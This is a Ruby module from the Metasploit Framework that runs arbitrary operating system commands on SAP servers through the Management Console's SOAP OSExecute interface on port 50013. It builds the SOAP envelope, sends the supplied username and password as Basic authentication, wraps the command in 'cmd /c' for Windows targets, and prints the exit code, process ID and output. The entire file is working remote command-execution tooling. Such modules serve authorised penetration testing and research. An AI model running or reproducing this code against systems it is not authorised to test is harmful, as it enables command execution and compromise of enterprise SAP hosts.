##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'         => 'SAP Management Console OSExecute',
			'Version'      => '$Revision$',
			'Description'  => %q{
				This module allows execution of operating system commands through the SAP
				Management Console SOAP Interface. A valid username and password must be
				provided.
				},
			'References'   =>
				[
					# General
					[ 'URL', 'http://blog.c22.cc' ]
				],
			'Author'       => [ 'Chris John Riley' ],
			'License'      => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(50013),
				OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),
				OptString.new('USERNAME', [true, 'Username to use', '']),
				OptString.new('PASSWORD', [true, 'Password to use', '']),
				OptString.new('CMD', [true, 'Command to run', 'set']),
				OptBool.new('UseWindows', [false, 'Use Windows syntax for command "cmd /c"', true]),
			], self.class)
		register_autofilter_ports([ 50013 ])
	end

	def rport
		datastore['RPORT']
	end

	def run_host(ip)
		res = send_request_cgi({
			'uri'     => "/#{datastore['URI']}",
			'method'  => 'GET',
			'headers' => {'User-Agent' => datastore['UserAgent']}
		}, 25)

		if not res
			print_error("#{rhost}:#{rport} [SAP] Unable to connect")
			return
		end

		osexecute(ip)
	end

	def osexecute(rhost)

		print_status("[SAP] Connecting to SAP Management Console SOAP Interface on #{rhost}:#{rport}")
		success = false

		if datastore['UseWindows']
			cmd_to_run = 'cmd /c ' + datastore['CMD']
		else
			cmd_to_run = datastore['CMD']
		end

		soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'
		xsi = 'http://www.w3.org/2001/XMLSchema-instance'
		xs = 'http://www.w3.org/2001/XMLSchema'
		sapsess = 'http://www.sap.com/webas/630/soap/features/session/'
		ns1 = 'ns1:OSExecute'

		data = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n"
		data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="' + soapenv + '"  xmlns:xsi="' + xsi
		data << '" xmlns:xs="' + xs + '">' + "\r\n"
		data << '<SOAP-ENV:Header>' + "\r\n"
		data << '<sapsess:Session xlmns:sapsess="' + sapsess + '">' + "\r\n"
		data << '<enableSession>true</enableSession>' + "\r\n"
		data << '</sapsess:Session>' + "\r\n"
		data << '</SOAP-ENV:Header>' + "\r\n"
		data << '<SOAP-ENV:Body>' + "\r\n"
		data << '<' + ns1 + ' xmlns:ns1="urn:SAPControl"><command>' + cmd_to_run
		data << '</command><async>0</async></' + ns1 + '>' + "\r\n"
		data << '</SOAP-ENV:Body>' + "\r\n"
		data << '</SOAP-ENV:Envelope>' + "\r\n\r\n"

		user_pass = Rex::Text.encode_base64(datastore['USERNAME'] + ":" + datastore['PASSWORD'])

		begin
			res = send_request_raw({
				'uri'     => "/#{datastore['URI']}",
				'method'  => 'POST',
				'data'    => data,
				'headers' =>
					{
						'Content-Length'  => data.length,
						'SOAPAction'      => '""',
						'Authorization'   => 'Basic ' + user_pass,
						'Content-Type'    => 'text/xml; charset=UTF-8',
					}
			}, 60)

			if res.code == 200
				success = true
				body = CGI::unescapeHTML(res.body)
				if body.match(/<exitcode>(.*)<\/exitcode>/i)
					exitcode = $1.to_i
				end
				if body.match(/<pid>(.*)<\/pid>/i)
					pid = $1.strip
				end
				if body.match(/<lines>(.*)<\/lines>/i)
					items = body.scan(/<item>(.*?)<\/item>/i)
				end
			elsif res.code == 500
				case res.body
				when /<faultstring>(.*)<\/faultstring>/i
					faultcode = "#{$1}"
					fault = true
				end
			else
				print_error("#{rhost}:#{rport} [SAP] Unknown response received")
				return
			end

		rescue ::Rex::ConnectionError
			print_error("#{rhost}:#{rport} [SAP] Unable to attempt authentication")
			return :abort
		end

		if success
			if exitcode > 0
				print_error("#{rhost}:#{rport} [SAP] Command exitcode: #{exitcode}")
			else
				print_good("#{rhost}:#{rport} [SAP] Command exitcode: #{exitcode}")
			end

			saptbl = Msf::Ui::Console::Table.new(
				Msf::Ui::Console::Table::Style::Default,
					'Header'  => '[SAP] OSExecute',
					'Prefix'  => "\n",
					'Columns' => [ 'Command output' ]
				)

			items.each do |output|
				saptbl << [ output[0] ]
			end

			print_good("#{rhost}:#{rport} [SAP] Command (#{cmd_to_run}) ran as PID: #{pid}\n#{saptbl.to_s}")

		elsif fault
			print_error("#{rhost}:#{rport} [SAP] Error code: #{faultcode}")
			return
		else
			print_error("#{rhost}:#{rport} [SAP] failed to run command")
			return
		end
	end
end
